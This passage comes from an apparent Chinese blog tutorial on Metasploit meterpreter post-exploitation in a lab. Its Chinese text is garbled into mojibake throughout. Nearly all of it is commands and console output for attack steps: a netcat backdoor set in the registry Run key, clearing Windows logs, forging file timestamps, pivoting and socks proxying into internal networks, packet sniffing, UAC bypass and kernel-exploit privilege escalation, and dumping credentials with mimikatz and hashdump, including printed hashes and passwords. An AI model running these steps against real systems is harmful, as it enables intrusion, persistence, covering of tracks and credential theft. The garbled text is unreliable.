cmd.exe&#x27; #è®¾ç½®é”®å€¼</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #æŸ¥çœ‹é”®å€¼</span><br><span class="line">nc -v 192.168.81.162 443  #æ”»å‡»è€…è¿æ¥ncåé—¨</span><br><span class="line"></span><br><span class="line"># æ¸…ç†æ—¥å¿—</span><br><span class="line">clearav  #æ¸…é™¤windowsä¸­çš„åº”ç”¨ç¨‹åºæ—¥å¿—ã€ç³»ç»Ÿæ—¥å¿—ã€å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure><h3 id="4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"><a href="#4-2-æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤" class="headerlink" title="4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤"></a>4.2 æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # åŸºæœ¬å‘½ä»¤</span><br><span class="line">search -f *pass* -d C:\\windows # æœç´¢æ–‡ä»¶  -hæŸ¥çœ‹å¸®åŠ©</span><br><span class="line">getwd/pwd  # è·å–å½“å‰ç›®å½•</span><br><span class="line">getlwd/lpwd   # æ“ä½œæ”»å‡»è€…ä¸»æœº æŸ¥çœ‹å½“å‰ç›®å½•</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # ä¸‹è½½æ–‡ä»¶</span><br><span class="line">edit c:\\1.txt  # ç¼–è¾‘æˆ–åˆ›å»ºæ–‡ä»¶  æ²¡æœ‰çš„è¯ï¼Œä¼šæ–°å»ºæ–‡ä»¶</span><br><span class="line">mkdir lltest2  # åªèƒ½åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹</span><br><span class="line">rmdir lltest2  # åªèƒ½åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶å¤¹</span><br><span class="line">lcd /tmp   # æ“ä½œæ”»å‡»è€…ä¸»æœº åˆ‡æ¢ç›®å½•</span><br><span class="line"></span><br><span class="line"># timestompä¼ªé€ æ–‡ä»¶æ—¶é—´æˆ³</span><br><span class="line">timestomp C:// -h   #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">timestomp -v C://2.txt   #æŸ¥çœ‹æ—¶é—´æˆ³</span><br><span class="line">timestomp C://2.txt -f C://1.txt #å°†1.txtçš„æ—¶é—´æˆ³å¤åˆ¶ç»™2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-ç½‘ç»œå‘½ä»¤"><a href="#4-3-ç½‘ç»œå‘½ä»¤" class="headerlink" title="4.3 ç½‘ç»œå‘½ä»¤"></a>4.3 ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># åŸºæœ¬</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat â€“ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #æŸ¥çœ‹ä»£ç†ä¿¡æ¯</span><br><span class="line">route   #æŸ¥çœ‹è·¯ç”±</span><br><span class="line"></span><br><span class="line"># portfwdç«¯å£è½¬å‘</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #ç„¶åä½¿ç”¨rdesktopæ¥è¿æ¥ï¼Œ-u ç”¨æˆ·å -p å¯†ç </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># æ·»åŠ è·¯ç”±</span><br><span class="line"></span><br><span class="line"># æ–¹å¼ä¸€autoroute ï¼ˆdeprecatedï¼‰</span><br><span class="line">run autoroute â€“h #æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">run autoroute -s 192.168.2.0/24  #æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run autoroute â€“p  #æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line"># æ–¹å¼äºŒpost/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #è‡ªåŠ¨æ·»åŠ åˆ°ç›®æ ‡ç¯å¢ƒç½‘ç»œ</span><br><span class="line">run post/multi/manage/autoroute CMD=print # æŸ¥çœ‹æ·»åŠ çš„è·¯ç”±</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># ç„¶åå¯ä»¥åˆ©ç”¨arp_scannerã€portscanç­‰è¿›è¡Œæ‰«æ</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autorouteæ·»åŠ å®Œè·¯ç”±åï¼Œè¿˜å¯ä»¥åˆ©ç”¨msfè‡ªå¸¦çš„æ¨¡å—è¿›è¡Œsocksä»£ç†</span><br><span class="line"># msfæä¾›äº†2ä¸ªæ¨¡å—ç”¨æ¥åšsocksä»£ç†ã€‚</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># å…ˆbackgroundé€€å‡ºæ¥ï¼Œç„¶åï¼š</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># ç„¶åvi /etc/proxychains.conf #æ·»åŠ  socks5 127.0.0.1 1080</span><br><span class="line"># æœ€åproxychains ä½¿ç”¨Socks5ä»£ç†è®¿é—®</span><br><span class="line"></span><br><span class="line"># snifferæŠ“åŒ…</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #æŸ¥çœ‹ç½‘å¡</span><br><span class="line">sniffer_start 2   #é€‰æ‹©ç½‘å¡ å¼€å§‹æŠ“åŒ…</span><br><span class="line">sniffer_stats 2   #æŸ¥çœ‹çŠ¶æ€</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #å¯¼å‡ºpcapæ•°æ®åŒ…</span><br><span class="line">sniffer_stop 2   #åœæ­¢æŠ“åŒ…</span><br></pre></td></tr></table></figure><h3 id="4-4-ä¿¡æ¯æ”¶é›†"><a href="#4-4-ä¿¡æ¯æ”¶é›†" class="headerlink" title="4.4 ä¿¡æ¯æ”¶é›†"></a>4.4 ä¿¡æ¯æ”¶é›†</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># ä¿¡æ¯æ”¶é›†çš„è„šæœ¬ä½äºï¼š</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># ä»¥ä¸‹åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„</span><br><span class="line">run post/windows/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/linux/gather/checkvm #æ˜¯å¦è™šæ‹Ÿæœº</span><br><span class="line">run post/windows/gather/forensics/enum_drives #æŸ¥çœ‹åˆ†åŒº</span><br><span class="line">run post/windows/gather/enum_applications #è·å–å®‰è£…è½¯ä»¶ä¿¡æ¯</span><br><span class="line">run post/windows/gather/dumplinks   #è·å–æœ€è¿‘çš„æ–‡ä»¶æ“ä½œ</span><br><span class="line">run post/windows/gather/enum_ie  #è·å–IEç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_chrome   #è·å–Chromeç¼“å­˜</span><br><span class="line">run post/windows/gather/enum_patches  #è¡¥ä¸ä¿¡æ¯</span><br><span class="line">run post/windows/gather/enum_domain  #æŸ¥æ‰¾åŸŸæ§</span><br></pre></td></tr></table></figure><h3 id="4-5-ææƒ"><a href="#4-5-ææƒ" class="headerlink" title="4.5 ææƒ"></a>4.5 ææƒ</h3><p>1.getsystemææƒ<br>getsystemå·¥ä½œåŸç†ï¼š<br>â‘ getsystemåˆ›å»ºä¸€ä¸ªæ–°çš„WindowsæœåŠ¡ï¼Œè®¾ç½®ä¸ºSYSTEMè¿è¡Œï¼Œå½“å®ƒå¯åŠ¨æ—¶è¿æ¥åˆ°ä¸€ä¸ªå‘½åç®¡é“ã€‚<br>â‘¡getsystemäº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªå‘½åç®¡é“å¹¶ç­‰å¾…æ¥è‡ªè¯¥æœåŠ¡çš„è¿æ¥ã€‚<br>â‘¢WindowsæœåŠ¡å·²å¯åŠ¨ï¼Œå¯¼è‡´ä¸å‘½åç®¡é“å»ºç«‹è¿æ¥ã€‚<br>â‘£è¯¥è¿›ç¨‹æ¥æ”¶è¿æ¥å¹¶è°ƒç”¨ImpersonateNamedPipeClientï¼Œä»è€Œä¸ºSYSTEMç”¨æˆ·åˆ›å»ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚<br>ç„¶åç”¨æ–°æ”¶é›†çš„SYSTEMæ¨¡æ‹Ÿä»¤ç‰Œäº§ç”Ÿcmd.exeï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰ä¸€ä¸ªSYSTEMç‰¹æƒè¿›ç¨‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure><p>2.bypassuac<br>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUACï¼‰æ˜¯å¾®è½¯åœ¨ Windows Vista ä»¥åç‰ˆæœ¬å¼•å…¥çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œæœ‰åŠ©äºé˜²æ­¢å¯¹ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„æ›´æ”¹ã€‚åº”ç”¨ç¨‹åºå’Œä»»åŠ¡å¯å§‹ç»ˆåœ¨éç®¡ç†å‘˜å¸æˆ·çš„å®‰å…¨ä¸Šä¸‹æ–‡ä¸­è¿è¡Œï¼Œé™¤éç®¡ç†å‘˜ä¸“é—¨ç»™ç³»ç»Ÿæˆäºˆç®¡ç†å‘˜çº§åˆ«çš„è®¿é—®æƒé™ã€‚UAC å¯ä»¥é˜»æ­¢æœªç»æˆæƒçš„åº”ç”¨ç¨‹åºè¿›è¡Œè‡ªåŠ¨å®‰è£…ï¼Œå¹¶é˜²æ­¢æ— æ„ä¸­æ›´æ”¹ç³»ç»Ÿè®¾ç½®ã€‚</p><p>msfæä¾›äº†å¦‚ä¸‹å‡ ä¸ªæ¨¡å—å¸®åŠ©ç»•è¿‡UACï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œ<strong>éœ€è¦å†æ¬¡æ‰§è¡Œgetsystemè·å–ç³»ç»Ÿæƒé™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># ç„¶åè¿”å›æ–°çš„meterpreterä¼šè¯ï¼Œç»§ç»­æ‰§è¡Œgetsystemæœ¬åº”è¯¥ä¼šææƒæˆåŠŸ</span><br><span class="line"># ç„¶é¹…è¿™é‡Œå¤±è´¥äº†</span><br></pre></td></tr></table></figure><p>3.å†…æ ¸æ¼æ´ææƒ</p><p>æ— è®ºæ˜¯linuxè¿˜æ˜¯windowséƒ½å‡ºè¿‡å¾ˆå¤šé«˜å±çš„æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒä»¬è¿›è¡Œæƒé™æå‡ï¼Œæ¯”å¦‚windowsç³»ç»Ÿçš„ms13-081ã€ms15-051ã€ms16-032ã€ms17-010ç­‰ï¼Œmsfä¹Ÿé›†æˆäº†è¿™äº›æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># ç„¶é¹…å¤±è´¥äº†ï¼Œæ‘¸æ‘¸å¤´</span><br></pre></td></tr></table></figure><h3 id="4-6-è·å–å‡­è¯"><a href="#4-6-è·å–å‡­è¯" class="headerlink" title="4.6 è·å–å‡­è¯"></a>4.6 è·å–å‡­è¯</h3><p>åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œä¸€ä¸ªç®¡ç†å‘˜å¯èƒ½ç®¡ç†å¤šå°æœåŠ¡å™¨ï¼Œä»–ä½¿ç”¨çš„å¯†ç æœ‰å¯èƒ½ç›¸åŒæˆ–è€…æœ‰è§„å¾‹ï¼Œå¦‚æœèƒ½å¤Ÿå¾—åˆ°å¯†ç æˆ–è€…hashï¼Œå†å°è¯•ç™»å½•å†…ç½‘å…¶å®ƒæœåŠ¡å™¨ï¼Œå¯èƒ½å–å¾—æ„æƒ³ä¸åˆ°çš„æ•ˆæœã€‚</p><p>1.ä½¿ç”¨mimikatz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz æŸ¥çœ‹å¸®åŠ©</span><br><span class="line">wdigest  #è·å–Wdigestå¯†ç </span><br><span class="line">mimikatz_command -f samdump::hashes  #æ‰§è¡ŒmimikatzåŸå§‹å‘½ä»¤</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># ç¤ºä¾‹</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) ï¿½İ¿ï¿½ </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure><ol><li>ä½¿ç”¨meterpreterçš„run hashdumpå‘½ä»¤</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure><p>3.post/windows/gather/smart_hashdump</p><p>ä»ä¸Šé¢ä¹Ÿå¯ä»¥çœ‹å‡ºå®˜æ–¹æ¨è<code>post/windows/gather/smart_hashdump</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure><p>4.powerdump<br>åŒ hashdumpï¼Œä½†å¤±è´¥äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 